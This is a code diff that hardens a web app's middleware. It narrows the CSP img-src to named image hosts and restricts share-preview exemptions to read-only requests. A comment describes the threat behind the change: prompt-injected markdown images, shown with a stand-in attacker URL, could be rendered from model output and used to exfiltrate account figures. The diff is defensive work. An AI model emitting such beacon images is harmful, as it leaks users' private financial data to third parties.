@@ -7,7 +7,11 @@ import {
   setNoStoreResponseHeaders,
 } from "@/lib/apiContracts";
 import { isAuthorizedProbeRequest } from "@/lib/probeAuth";
-import { PUBLIC_SHARE_API_ROUTES } from "@/lib/publicShareRoutes";
+import { IMAGE_HOST_SOURCES } from "@/lib/imageHosts";
+import {
+  AUTHENTICATED_SHARE_GENERATOR_ROUTES,
+  PUBLIC_SHARE_API_ROUTES,
+} from "@/lib/publicShareRoutes";
 import { handleDemoGate } from "@/lib/demo/demoGate";
 import type { DemoPublicMetadata } from "@/lib/demo/demoRole";
 
@@ -66,9 +70,25 @@ const CLERK_HOSTS =
 
 // Cloudflare Turnstile CAPTCHA — Clerk loads its bot-protection challenge from
 // this origin as both an unnonced <script src> and a sandboxed <iframe>.
-// Must appear in script-src AND frame-src; connect-src / img-src / worker-src
-// are already open via their https: / wss: / blob: wildcards.
+// Must appear in script-src AND frame-src. Turnstile needs no img-src entry
+// (its challenge renders inside that iframe, under the iframe's own origin);
+// connect-src / worker-src stay open via their https: / wss: / blob: wildcards.
+// img-src is NOT a wildcard any more — see IMAGE_HOSTS below before adding an
+// image source for anything.
 const CAPTCHA_HOSTS = "https://challenges.cloudflare.com";
+
+// img-src was a bare `https:` wildcard, which gave any image URL that reaches
+// the DOM a network egress path to an arbitrary host. The assistant renders
+// model output as markdown, and that output can quote untrusted retrieved text
+// (scraped newsfeed bodies), so an injected `![](https://attacker/?d=…)` was an
+// exfiltration beacon for whatever account figures the answer carried. Scoped
+// to the hosts the app actually loads images from: the Radon media CDN
+// (newsfeed cards, avatars; matches next.config.mjs images.remotePatterns) and
+// Clerk's image CDN (user.imageUrl). Same-origin /_next/image output, data:
+// avatar uploads and blob: share previews are covered by the literals below.
+// The host list lives in lib/imageHosts.ts so the profile avatar validator
+// cannot drift wider than what this directive permits.
+const IMAGE_HOSTS = IMAGE_HOST_SOURCES;
 
 export function generateNonce(): string {
   return btoa(crypto.randomUUID());
@@ -89,7 +109,7 @@ export function buildCspWithNonce(nonce: string): string {
     scriptSrc,
     "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     "font-src 'self' https://fonts.gstatic.com data:",
-    "img-src 'self' https: data: blob:",
+    `img-src 'self' ${IMAGE_HOSTS} ${CLERK_HOSTS} data: blob:`,
     "connect-src 'self' wss: https:",
     // Clerk's clerk-js spawns a same-origin blob: Web Worker (bot/telemetry);
     // worker-src falls back to script-src, which would block it without this.
@@ -154,7 +174,7 @@ export function isLocalDevAuthBypassEnabled(
 // @/lib/publicShareRoutes (shared with app/robots.ts, which must carve these
 // out of its Disallow: / so preview bots keep unfurling shared cards).
 // Re-exported so the perimeter tests keep pinning it from the middleware.
-export { PUBLIC_SHARE_API_ROUTES };
+export { AUTHENTICATED_SHARE_GENERATOR_ROUTES, PUBLIC_SHARE_API_ROUTES };
 
 // Inbound webhooks — verified by the SENDER's signature inside the route
 // handler (svix HMAC for Clerk), not by a Clerk session. EXPLICIT list with a
@@ -167,7 +187,10 @@ export const PUBLIC_WEBHOOK_API_ROUTES = ["/api/webhooks/clerk"] as const;
 // session. The narrow exemptions:
 //
 //   /sign-in, /sign-up                  — Clerk auth flow pages
-//   PUBLIC_SHARE_API_ROUTES             — share-card link previews (above)
+//   PUBLIC_SHARE_API_ROUTES             — READ-ONLY share-card link previews
+//                                          (above). The generator POSTs are
+//                                          deliberately absent: they execute a
+//                                          report script on the trading host.
 //   /api/service-health                 — dashboard banner data; intentionally
 //                                          accessible so monitoring pollers
 //                                          and the future public status page
@@ -196,6 +219,20 @@ export const isPublicRoute = createRouteMatcher([
 
 export function isApiPath(pathname: string): boolean {
   return pathname === "/api" || pathname.startsWith("/api/");
+}
+
+// Link-preview bots only ever GET a card, so the share exemption is scoped to
+// reads. A write to a public preview path is not a preview fetch and falls
+// through to Clerk. Scoped to the share paths so the webhook POST and the Clerk
+// auth pages keep their exemption.
+const PREVIEW_SAFE_METHODS = new Set(["GET", "HEAD"]);
+
+export function isPublicRequest(request: NextRequest): boolean {
+  if (!isPublicRoute(request)) return false;
+  if (!(PUBLIC_SHARE_API_ROUTES as readonly string[]).includes(request.nextUrl.pathname)) {
+    return true;
+  }
+  return PREVIEW_SAFE_METHODS.has(request.method.toUpperCase());
 }
 
 // Operator allowlist — the AUTHORIZATION layer on top of authentication.
@@ -313,7 +350,7 @@ const clerkHandler = clerkMiddleware(async (auth, request) => {
   // layout + ThemeBootstrap, so they need the nonce + enforced CSP too. The
   // enumerated public *API* routes (share/webhook) return JSON with no inline
   // scripts — emitting CSP on them is harmless and keeps one code path.
-  if (isPublicRoute(request)) return withNonceCsp(request);
+  if (isPublicRequest(request)) return withNonceCsp(request);
 
   const isApi = isApiPath(request.nextUrl.pathname);
   const { userId, sessionClaims } = await auth();
